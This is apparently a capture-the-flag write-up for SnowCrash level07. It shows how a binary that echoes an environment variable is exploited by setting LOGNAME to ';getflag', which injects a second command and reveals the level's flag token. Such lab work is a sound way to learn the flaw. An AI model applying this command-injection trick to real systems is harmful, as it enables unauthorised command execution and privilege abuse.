This one start with a binary file at the user's home.

The binary is named `level07` and print `level07` when executed.

As a "strange" coincidence this is also the username of this level.

I filter all the `'level07'` string from env variables and receive the following:

```bash
level07@SnowCrash:~$ env | grep level07
USER=level07
MAIL=/var/mail/level07
PWD=/home/user/level07
HOME=/home/user/level07
LOGNAME=level07
```

So I think that I should probably target USER or LOGNAME to get the token.

```bash
# if LOGNAME is used to execute a shell cmd,
# it will now terminate the cmd and run getflag

export LOGNAME=';getflag'
```

As expected, the `level07` bin make use of an env var to display its value and the previous hack is just enough to get the flag.

```bash
level07@SnowCrash:~$ ./level07

Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```
